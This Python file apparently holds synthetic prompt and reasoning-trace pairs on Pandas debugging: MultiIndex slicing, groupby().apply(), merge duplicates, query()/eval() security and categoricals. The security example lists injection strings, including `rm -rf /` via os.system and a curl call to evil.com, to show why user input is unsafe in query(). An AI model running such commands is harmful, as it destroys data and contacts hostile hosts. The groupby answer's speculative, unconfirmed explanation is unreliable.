"""Thinking-trace pairs: advanced Pandas debugging."""

PAIRS = [
    (
        "thinking/debugging",
        r'''I have a Pandas DataFrame with a MultiIndex and I'm getting unexpected results when slicing. Here is my code:

import pandas as pd
import numpy as np

arrays = [
    ["bar", "bar", "baz", "baz", "foo", "foo"],
    ["one", "two", "one", "two", "one", "two"],
]
tuples = list(zip(*arrays))
index = pd.MultiIndex.from_tuples(tuples, names=["first", "second"])
df = pd.DataFrame(np.random.randn(6, 3), index=index, columns=["A", "B", "C"])

# This works fine
result1 = df.loc["bar"]

# But this raises KeyError
result2 = df.loc["bar":"foo"]

# And this gives wrong results
result3 = df.loc[("bar", "one"):("foo", "two")]

Why is the slicing failing and how do I fix it?''',
        r'''<think>
Let me analyze the MultiIndex slicing issues one by one.

First issue: df.loc["bar":"foo"] raising KeyError.
MultiIndex slicing with label-based ranges requires the index to be sorted (lexicographically). If the MultiIndex is not sorted, Pandas raises a UnsortedIndexError or KeyError when trying to do slice-based selection. The from_tuples constructor does not guarantee sorting.

Second issue: df.loc[("bar", "one"):("foo", "two")] giving wrong results.
Even if sorted, tuple-based slicing on MultiIndex can be tricky. The slice is inclusive on both ends for label-based indexing, but the behavior depends on whether the index is properly sorted.

The fix is to sort the MultiIndex first using sort_index(), and then use the proper slicing syntax. For partial indexing on specific levels, we should use pd.IndexSlice or the xs() method.

Let me also think about the cross-section approach as an alternative.
</think>

The root cause is that MultiIndex slicing requires a **sorted index**. Pandas cannot do efficient label-based slicing on an unsorted MultiIndex and will raise `UnsortedIndexError` (or `KeyError` depending on the version).

Here is the corrected code with explanations:

```python
import pandas as pd
import numpy as np

arrays = [
    ["bar", "bar", "baz", "baz", "foo", "foo"],
    ["one", "two", "one", "two", "one", "two"],
]
tuples = list(zip(*arrays))
index = pd.MultiIndex.from_tuples(tuples, names=["first", "second"])
df = pd.DataFrame(np.random.randn(6, 3), index=index, columns=["A", "B", "C"])

# STEP 1: Sort the index first -- this is REQUIRED for slice-based loc
df = df.sort_index()

# Now this works: slice on first level
result2 = df.loc["bar":"foo"]
print("Slice bar to foo:")
print(result2)

# Tuple-based slicing also works now
result3 = df.loc[("bar", "one"):("foo", "two")]
print("\nTuple slice (bar,one) to (foo,two):")
print(result3)

# ALTERNATIVE: Use pd.IndexSlice for more explicit slicing
idx = pd.IndexSlice

# Select all rows where first level is "bar" or "baz"
result4 = df.loc[idx["bar":"baz", :], :]
print("\nUsing IndexSlice for bar:baz, all second level:")
print(result4)

# Select specific second-level values across all first levels
result5 = df.loc[idx[:, "one"], :]
print("\nAll first levels, second level = one:")
print(result5)

# ALTERNATIVE 2: Use .xs() for cross-section selection
# This does not require a sorted index
result6 = df.xs("one", level="second")
print("\nCross-section where second=one:")
print(result6)
```

Key rules for MultiIndex slicing:

1. **Always call `df.sort_index()`** before using slice notation with `.loc[]`. Without sorting, Pandas cannot determine the boundaries of the slice efficiently.

2. **Use `pd.IndexSlice`** for complex multi-level slices -- it makes the intent clearer and avoids ambiguity between tuple indexing and multi-level indexing.

3. **Use `.xs()`** when you want a cross-section at a particular level -- it works regardless of sort order and is often more readable.

4. **Check `df.index.is_monotonic_increasing`** to verify whether your index is sorted before slicing. If it returns False, your slices will fail or produce incorrect results.''',
    ),
    (
        "thinking/debugging",
        r'''My Pandas groupby().apply() is returning duplicate index entries and the shape of the result is wrong. Here is my code:

import pandas as pd

df = pd.DataFrame({
    "group": ["A", "A", "A", "B", "B", "B"],
    "value": [10, 20, 30, 40, 50, 60],
    "weight": [1, 2, 3, 1, 2, 3],
})

def weighted_avg(group_df):
    return pd.Series({
        "weighted_mean": (group_df["value"] * group_df["weight"]).sum() / group_df["weight"].sum(),
        "count": len(group_df),
    })

result = df.groupby("group").apply(weighted_avg)
print(result)
# Expected: 2 rows (one per group) with weighted_mean and count columns
# Actual: Getting 6 rows with duplicated group index

What is going wrong?''',
        r'''<think>
Let me think about what could cause duplicate index entries with groupby().apply().

When you use groupby().apply(), Pandas calls the function on each group. The behavior of the result depends on what the function returns:

1. If the function returns a scalar, you get a Series with the group keys as the index.
2. If the function returns a Series, Pandas tries to combine them. The Series index becomes columns if group_keys=True (default).
3. If the function returns a DataFrame, Pandas concatenates them.

The issue here is likely related to the `group_keys` parameter. In newer versions of Pandas (1.3+), the default behavior changed. When `group_keys=True` (the default), the group keys are added to the index, which can cause the original index to be preserved alongside the group keys, creating a MultiIndex.

Actually, wait. The user says they are getting 6 rows instead of 2. That suggests the function is returning something that gets aligned back to the original index. Let me reconsider...

The function returns a pd.Series with 2 entries. With groupby().apply(), if the returned Series has an index that matches column names, Pandas may try to broadcast. But more likely, the issue is that Pandas is running the function twice on the first group (to determine the return type) and then the results get duplicated.

Actually, the most common cause of this issue is `group_keys=True` combined with a function that returns a Series whose index does not align with the original DataFrame index. In this case, Pandas creates a MultiIndex with both the group key and the Series index.

But the user said 6 rows, not 4 rows (2 groups x 2 values). That suggests something else is happening -- perhaps the function is being applied row-wise or the result is being aligned back to the original index somehow.

Let me reconsider: the function returns a Series with index ["weighted_mean", "count"]. With apply(), this should create a DataFrame with groups as rows and Series index as columns. So the expected output is correct (2 rows).

The 6-row issue might be a version-specific behavior or the user might have `group_keys=True` causing a reindex to the original index. In some Pandas versions, apply can behave unexpectedly.

The fix is to use `group_keys=False` or use `.agg()` instead.
</think>

This is a well-known Pandas gotcha with `groupby().apply()`. The problem has several possible causes depending on your Pandas version:

```python
import pandas as pd

df = pd.DataFrame({
    "group": ["A", "A", "A", "B", "B", "B"],
    "value": [10, 20, 30, 40, 50, 60],
    "weight": [1, 2, 3, 1, 2, 3],
})

# PROBLEM: apply() with group_keys=True (default) can cause index issues
# In some Pandas versions, the result gets a MultiIndex or is reindexed
# to the original DataFrame index.

# FIX 1: Use group_keys=False
def weighted_avg(group_df):
    return pd.Series({
        "weighted_mean": (group_df["value"] * group_df["weight"]).sum() / group_df["weight"].sum(),
        "count": len(group_df),
    })

result = df.groupby("group", group_keys=False).apply(weighted_avg)
print("Fix 1 - group_keys=False:")
print(result)
print(f"Shape: {result.shape}")  # Should be (2, 2)

# FIX 2 (PREFERRED): Use .agg() with named aggregation instead of apply()
# This is faster and avoids the apply() pitfalls entirely
result2 = df.groupby("group").agg(
    weighted_mean=("value", lambda x: (x * df.loc[x.index, "weight"]).sum() / df.loc[x.index, "weight"].sum()),
    count=("value", "count"),
)
print("\nFix 2 - named aggregation:")
print(result2)

# FIX 3: Compute weighted average without apply() at all
df["weighted_value"] = df["value"] * df["weight"]
result3 = pd.DataFrame({
    "weighted_mean": df.groupby("group")["weighted_value"].sum() / df.groupby("group")["weight"].sum(),
    "count": df.groupby("group")["value"].count(),
})
print("\nFix 3 - direct computation:")
print(result3)
```

**Why this happens:**

1. `group_keys=True` (the default) adds the group keys to the result index. When your function returns a Series, this can create a MultiIndex combining the group key with the Series index.

2. In some Pandas versions, `apply()` runs the function **twice** on the first group to infer the return type. If your function has side effects, this causes bugs.

3. The `apply()` function tries to be "smart" about combining results, and its heuristics sometimes guess wrong -- aligning results back to the original index instead of creating a new grouped result.

**Best practices:**
- Avoid `apply()` when possible -- use `agg()`, `transform()`, or vectorized operations
- Always pass `group_keys=False` if you do use `apply()`
- Never rely on side effects inside `apply()` functions
- Test with `print(result.index)` and `print(result.shape)` to verify the output structure''',
    ),
    (
        "thinking/debugging",
        r'''I am merging two DataFrames and getting unexpected duplicate rows. My code:

import pandas as pd

orders = pd.DataFrame({
    "order_id": [1, 2, 3, 4],
    "customer": ["Alice", "Bob", "Alice", "Charlie"],
    "amount": [100, 200, 150, 300],
})

customers = pd.DataFrame({
    "customer": ["Alice", "Bob", "Charlie", "Alice"],
    "region": ["East", "West", "East", "North"],
})

merged = orders.merge(customers, on="customer")
print(merged)
# Expected: 4 rows (one per order)
# Actual: 6 rows -- Alice orders are duplicated

How do I fix the merge to not produce duplicates?''',
        r'''<think>
The issue is clear: the `customers` DataFrame has duplicate entries for "Alice" -- she appears with region "East" AND region "North". When you do a merge (which is an inner join by default), each Alice order (order_id 1 and 3) gets matched to BOTH Alice customer rows, producing 2 x 2 = 4 Alice rows instead of 2.

So the total is: 4 Alice rows + 1 Bob row + 1 Charlie row = 6 rows instead of the expected 4.

The fix depends on what the user actually wants:
1. If each customer should have only one region, the customers table has dirty data and needs deduplication first.
2. If customers can have multiple regions, the merge behavior is correct but the user needs to decide which region to keep.
3. If they want to validate the merge, they should use `validate` parameter.

Let me provide solutions for all three scenarios.
</think>

The problem is that your `customers` DataFrame has **duplicate keys** -- "Alice" appears twice with different regions ("East" and "North"). When Pandas does a merge, it creates a **Cartesian product** for matching keys: each Alice order matches both Alice customer rows, doubling those rows.

Here is how to diagnose and fix this:

```python
import pandas as pd

orders = pd.DataFrame({
    "order_id": [1, 2, 3, 4],
    "customer": ["Alice", "Bob", "Alice", "Charlie"],
    "amount": [100, 200, 150, 300],
})

customers = pd.DataFrame({
    "customer": ["Alice", "Bob", "Charlie", "Alice"],
    "region": ["East", "West", "East", "North"],
})

# DIAGNOSIS: Check for duplicate keys BEFORE merging
print("Duplicate customers:", customers["customer"].duplicated().sum())
print("Duplicated rows:")
print(customers[customers["customer"].duplicated(keep=False)])

# FIX 1: Use validate parameter to catch this early
# This will raise MergeError if the right side has duplicate keys
try:
    merged = orders.merge(customers, on="customer", validate="many_to_one")
except pd.errors.MergeError as e:
    print(f"Merge validation failed: {e}")

# FIX 2: Deduplicate the right DataFrame first (keep first occurrence)
customers_deduped = customers.drop_duplicates(subset="customer", keep="first")
merged_fix2 = orders.merge(customers_deduped, on="customer")
print("\nFix 2 - drop_duplicates (keep first):")
print(merged_fix2)

# FIX 3: Deduplicate by choosing a specific row (e.g., most recent)
# If you had a timestamp, you would sort by it first
customers_latest = (
    customers
    .sort_values("customer")  # or sort by a date column
    .groupby("customer")
    .last()
    .reset_index()
)
merged_fix3 = orders.merge(customers_latest, on="customer")
print("\nFix 3 - groupby last:")
print(merged_fix3)

# FIX 4: If multiple regions are valid, aggregate them
customers_agg = (
    customers
    .groupby("customer")["region"]
    .agg(list)
    .reset_index()
)
merged_fix4 = orders.merge(customers_agg, on="customer")
print("\nFix 4 - aggregate regions into list:")
print(merged_fix4)

# PREVENTION: Always use validate parameter in production code
# "one_to_one"  - both sides unique
# "one_to_many"  - left side unique
# "many_to_one"  - right side unique
# "many_to_many" - no validation (default, dangerous)
```

**Key takeaway:** Always use the `validate` parameter in production merges. The default `many_to_many` silently creates Cartesian products on duplicate keys, which is almost never what you want. Setting `validate="many_to_one"` or `validate="one_to_one"` will immediately surface data quality issues before they corrupt your analysis.''',
    ),
    (
        "thinking/debugging",
        r'''I'm using pd.eval() and df.query() in my Pandas application for performance but getting strange errors and security concerns. Here is my code:

import pandas as pd
import numpy as np

df = pd.DataFrame({
    "price": [10.5, 20.3, 15.7, 30.1],
    "quantity": [100, 200, 150, 50],
    "category": ["A", "B", "A", "B"],
})

# This works
result1 = df.query("price > 15")

# This fails with "undefined variable" error
min_price = 15
result2 = df.query("price > min_price")

# Security concern: can users inject code through query strings?
user_input = "price > 10"  # what if this is malicious?
result3 = df.query(user_input)

How do I fix the variable reference issue and handle the security concern?''',
        r'''<think>
Two issues here:

1. Variable reference in query(): Local variables need to be prefixed with `@` in query strings. So it should be `df.query("price > @min_price")`.

2. Security: `pd.eval()` and `df.query()` use a parser that can execute arbitrary Python expressions. While it is more limited than raw `eval()`, it is still dangerous with user input. The `engine` parameter matters too -- the default 'numexpr' engine is somewhat safer than 'python' engine, but neither should be trusted with user input.

Let me provide comprehensive guidance on both issues.
</think>

There are two distinct issues here: variable scoping syntax and security risks.

**Issue 1: Variable References**

In `df.query()` and `pd.eval()`, local and global variables must be prefixed with `@`:

```python
import pandas as pd
import numpy as np

df = pd.DataFrame({
    "price": [10.5, 20.3, 15.7, 30.1],
    "quantity": [100, 200, 150, 50],
    "category": ["A", "B", "A", "B"],
})

min_price = 15
max_qty = 150

# WRONG: bare variable names are treated as column references
# result = df.query("price > min_price")  # KeyError: 'min_price'

# CORRECT: prefix local/global variables with @
result = df.query("price > @min_price")
print(result)

# Multiple variable references work the same way
result2 = df.query("price > @min_price and quantity <= @max_qty")
print(result2)

# You can also reference variables in pd.eval()
df["total"] = pd.eval("df.price * df.quantity")

# For f-string-style interpolation (less clean but works without @)
result3 = df.query(f"price > {min_price}")
print(result3)
```

**Issue 2: Security of query() and eval()**

```python
# DANGER: Never pass untrusted user input to query() or eval()

# Example of what a malicious user could do:
malicious_inputs = [
    "__import__('os').system('rm -rf /')",  # shell command injection
    "__import__('subprocess').call(['curl', 'evil.com'])",
    "price > 0; import os",  # statement injection
]

# The 'numexpr' engine (default) blocks most attacks but is NOT foolproof
# The 'python' engine is essentially raw eval() and is VERY dangerous

# SAFE APPROACH: Validate and sanitize user input
import re

def safe_query(df, user_filter):
    """Safely filter a DataFrame based on user input."""
    # Whitelist allowed column names
    allowed_columns = set(df.columns)

    # Whitelist allowed operators
    allowed_pattern = re.compile(
        r'^[\w\s\.\,\(\)><=!&|+\-*/]+$'
    )

    if not allowed_pattern.match(user_filter):
        raise ValueError(f"Invalid filter expression: {user_filter}")

    # Check that only known column names are used as identifiers
    # Extract all word tokens from the expression
    tokens = re.findall(r'[a-zA-Z_]\w*', user_filter)
    keywords = {"and", "or", "not", "in", "True", "False", "None"}

    for token in tokens:
        if token not in allowed_columns and token not in keywords:
            # Check if it is a number-like string
            try:
                float(token)
            except ValueError:
                raise ValueError(
                    f"Unknown identifier in filter: '{token}'. "
                    f"Allowed columns: {allowed_columns}"
                )

    return df.query(user_filter, engine="numexpr")

# Usage
try:
    result = safe_query(df, "price > 15 and quantity < 200")
    print("Safe query result:")
    print(result)
except ValueError as e:
    print(f"Rejected: {e}")

# BEST APPROACH: Don't use query() with user input at all.
# Instead, build filters programmatically:
def build_filter(df, column, operator, value):
    """Build a filter mask without eval/query."""
    if column not in df.columns:
        raise ValueError(f"Unknown column: {column}")
    ops = {
        ">": lambda col, val: col > val,
        "<": lambda col, val: col < val,
        ">=": lambda col, val: col >= val,
        "<=": lambda col, val: col <= val,
        "==": lambda col, val: col == val,
        "!=": lambda col, val: col != val,
    }
    if operator not in ops:
        raise ValueError(f"Unknown operator: {operator}")
    return df[ops[operator](df[column], value)]

result = build_filter(df, "price", ">", 15)
print("Programmatic filter result:")
print(result)
```

**Summary:** Use `@` for variable references in query/eval. Never pass user-controlled strings to `query()` or `pd.eval()` -- build filters programmatically instead.''',
    ),
    (
        "thinking/debugging",
        r'''My Pandas Categorical column is causing problems when I try to filter and merge. Here is my code:

import pandas as pd

df = pd.DataFrame({
    "status": pd.Categorical(["active", "inactive", "active", "pending"],
                              categories=["active", "inactive", "pending"]),
    "value": [10, 20, 30, 40],
})

# Problem 1: filtering produces empty result when I expect matches
filtered = df[df["status"] == "Active"]  # capital A
print(f"Filtered: {len(filtered)} rows")  # 0 rows!

# Problem 2: assigning a new value not in categories raises error
df.loc[0, "status"] = "archived"

# Problem 3: merging with non-categorical column behaves oddly
other = pd.DataFrame({"status": ["active", "inactive"], "label": ["A", "I"]})
merged = df.merge(other, on="status")

What are the issues and how to handle categoricals properly?''',
        r'''<think>
Three issues with Categorical columns:

1. Case sensitivity: "Active" != "active" -- categorical comparison is exact string match, no case folding. Since "Active" is not in the categories, the comparison returns all False.

2. Assigning a value not in the defined categories raises a TypeError (or ValueError depending on version). You need to add the category first or use an unordered categorical.

3. Merging a categorical column with a non-categorical column: Pandas will try to align the types. In some versions this works but can produce unexpected results with categories that don't exist in the other DataFrame.

Let me provide solutions for all three.
</think>

Categorical columns in Pandas are strict about their allowed values and comparisons. Here are the fixes for each problem:

```python
import pandas as pd
import numpy as np

df = pd.DataFrame({
    "status": pd.Categorical(
        ["active", "inactive", "active", "pending"],
        categories=["active", "inactive", "pending"]
    ),
    "value": [10, 20, 30, 40],
})

# ============================================================
# PROBLEM 1: Case-sensitive comparison
# ============================================================
# "Active" != "active" -- categoricals are case-sensitive
filtered_wrong = df[df["status"] == "Active"]  # 0 rows
filtered_right = df[df["status"] == "active"]  # 2 rows
print(f"Wrong case: {len(filtered_wrong)} rows")
print(f"Right case: {len(filtered_right)} rows")

# If you need case-insensitive matching, convert to string first
filtered_ci = df[df["status"].str.lower() == "active".lower()]
print(f"Case-insensitive: {len(filtered_ci)} rows")

# ============================================================
# PROBLEM 2: Assigning values not in categories
# ============================================================
# This raises TypeError: Cannot setitem on a Categorical with a new category
try:
    df.loc[0, "status"] = "archived"
except TypeError as e:
    print(f"Error: {e}")

# FIX 2a: Add the category first, then assign
df["status"] = df["status"].cat.add_categories(["archived"])
df.loc[0, "status"] = "archived"
print("\nAfter adding category and assigning:")
print(df["status"])

# FIX 2b: Use set_categories to replace all categories at once
df["status"] = df["status"].cat.set_categories(
    ["active", "inactive", "pending", "archived", "deleted"]
)

# FIX 2c: Remove unused categories to keep things clean
print(f"\nCategories before: {df['status'].cat.categories.tolist()}")
df["status"] = df["status"].cat.remove_unused_categories()
print(f"Categories after cleanup: {df['status'].cat.categories.tolist()}")

# ============================================================
# PROBLEM 3: Merging categorical with non-categorical
# ============================================================
other = pd.DataFrame({
    "status": ["active", "inactive"],
    "label": ["A", "I"],
})

# Check types before merging
print(f"\ndf status dtype: {df['status'].dtype}")
print(f"other status dtype: {other['status'].dtype}")

# FIX 3a: Convert categorical to string before merging
df_str = df.copy()
df_str["status"] = df_str["status"].astype(str)
merged = df_str.merge(other, on="status")
print("\nMerged (after converting to str):")
print(merged)

# FIX 3b: Convert both to categorical with same categories
shared_cats = list(
    set(df["status"].cat.categories) | set(other["status"].unique())
)
df_cat = df.copy()
other_cat = other.copy()
df_cat["status"] = df_cat["status"].cat.set_categories(shared_cats)
other_cat["status"] = pd.Categorical(other_cat["status"], categories=shared_cats)
merged2 = df_cat.merge(other_cat, on="status")
print("\nMerged (matching categoricals):")
print(merged2)

# ============================================================
# BEST PRACTICES for Categoricals
# ============================================================
# 1. Use categoricals for columns with a small fixed set of values
#    (e.g., status, region, priority) -- saves memory
# 2. Always define categories explicitly if order matters
#    pd.Categorical(data, categories=[...], ordered=True)
# 3. Convert to string before operations that might introduce
#    new values (user input, merges with external data)
# 4. Use .cat accessor for category management:
#    .cat.add_categories(), .cat.remove_categories(),
#    .cat.rename_categories(), .cat.reorder_categories()
# 5. Check df.dtypes before merges to catch type mismatches
```

**Key insight:** Categoricals enforce a closed set of allowed values. This is a feature for data integrity, but it becomes a bug when your code assumes string-like flexibility. Convert to string when you need flexibility; keep categorical when you need memory efficiency and data validation.''',
    ),
]
